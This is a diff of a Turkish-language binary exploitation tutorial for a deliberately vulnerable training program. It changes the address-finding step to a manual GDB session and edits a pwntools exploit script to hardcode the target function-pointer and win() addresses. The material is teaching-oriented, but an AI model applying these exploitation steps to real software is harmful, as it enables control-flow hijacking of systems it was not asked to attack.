@@ -62,7 +62,22 @@ g++ -std=c++11 -o vulnerable_code vulnerable_code.cpp -no-pie -g -Wno-unused-res
 
 #### 1\. Gerekli Adresleri Bulma
 
-Program, başlangıçta bize gerekli tüm adresleri zaten veriyor. Bu adresleri exploit betiğimizde yakalayacağız.
+Program artık adresleri otomatik olarak yazdırmıyor. Bu adresleri GDB ile manuel olarak bulmanız gerekiyor:
+
+**GDB ile Adres Bulma:**
+
+```bash
+gdb ./vulnerable_code
+(gdb) break main
+(gdb) run
+(gdb) p &gTarget.fn
+$1 = (void (**)()) 0x404040
+(gdb) p win
+$2 = {void (void)} 0x4011a0 <win()>
+(gdb) quit
+```
+
+Bu adresleri not edin - exploit betiğinizde kullanacaksınız.
 
 #### 2\. Zafiyetin GDB ile Tespiti (Adım Adım)
 
@@ -141,13 +156,10 @@ import re
 # Pwntools ile süreci başlat
 p = process("./vulnerable_code")
 
-# Adresleri yakalamak için programın başlangıç çıktısını al
-initial_output = p.recvuntil(b"> ").decode()
-print(initial_output)
-
-# Regex ile adresleri yakala
-target_fn_addr = int(re.search(r"&gTarget.fn = (0x[0-9a-f]+)", initial_output).group(1), 16)
-win_addr = int(re.search(r"&win        = (0x[0-9a-f]+)", initial_output).group(1), 16)
+# Manuel olarak bulunan adresleri buraya yazın
+# GDB ile bulduğunuz adresleri aşağıdaki değişkenlere atayın
+target_fn_addr = 0x404040  # GDB'den aldığınız &gTarget.fn adresi
+win_addr = 0x4011a0        # GDB'den aldığınız win fonksiyonu adresi
 
 log.info(f"Hedef &gTarget.fn adresi: {hex(target_fn_addr)}")
 log.info(f"Hedef &win adresi: {hex(win_addr)}")
